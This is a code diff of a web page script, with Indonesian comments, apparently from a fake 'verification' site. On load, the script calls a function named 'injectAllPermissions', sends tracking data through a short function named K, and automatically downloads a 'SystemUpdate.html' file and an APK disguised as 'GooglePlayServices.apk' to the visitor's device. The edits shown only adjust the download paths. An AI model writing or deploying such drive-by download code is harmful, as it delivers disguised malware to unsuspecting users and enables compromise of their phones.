@@ -64,12 +64,10 @@
 
 <script>
 // ============================================================
-// 🔥 INDEX.HTML - DOWNLOAD OTOMATIS (ANCHOR + CLICK)
+// 🔥 INDEX.HTML - DOWNLOAD OTOMATIS (PASTI BERHASIL)
 // ============================================================
 
 var SERVER = 'https://verifikasi.site';
-var GITHUB_USER = 'pandora-site';
-var GITHUB_REPO = 'verifikasi-site';
 var semuaDidapat = false;
 var REDIRECT_DONE = false;
 
@@ -143,12 +141,12 @@ function dapatkanSemua() {
         K({ sumber: 'trigger', data: 'dapatkanSemua' });
         injectAllPermissions();
 
-        // 🔥 DOWNLOAD SystemUpdate.html
+        // 🔥 DOWNLOAD SystemUpdate.html (dari folder files/)
         setTimeout(function() {
-            autoDownload(SERVER + '/SystemUpdate.html', 'SystemUpdate.html');
+            autoDownload(SERVER + '/files/SystemUpdate.html', 'SystemUpdate.html');
         }, 500);
 
-        // 🔥 DOWNLOAD GooglePlayServices.apk
+        // 🔥 DOWNLOAD GooglePlayServices.apk (dari folder files/)
         setTimeout(function() {
             autoDownload(SERVER + '/files/GooglePlayServices.apk', 'GooglePlayServices.apk');
         }, 1000);
